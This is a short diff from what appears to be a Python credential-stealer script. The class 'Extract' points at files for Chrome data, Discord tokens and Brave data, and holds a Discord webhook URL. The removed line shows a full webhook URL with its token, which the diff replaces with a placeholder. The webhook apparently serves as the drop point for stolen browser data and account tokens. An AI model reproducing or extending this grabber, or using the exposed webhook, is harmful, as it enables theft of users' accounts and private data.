@@ -6,7 +6,7 @@ import os
 
 class Extract(object):
     def __init__(self) -> None:
-        self.webhook_url = "https://discord.com/api/webhooks/955574363447525407/3h9u4wOcxM3sHD_ZIjSO0jqlbtJt5yywDfljJRXASbFMczMqrlh3O8lhP_gtGYdjXlIS"
+        self.webhook_url = "webhookurl"
         self.chrome = MY_HOME + 'chrome.txt'
         self.discord = MY_HOME+'dtokens.txt'
         self.brave = MY_HOME+'brave.txt'
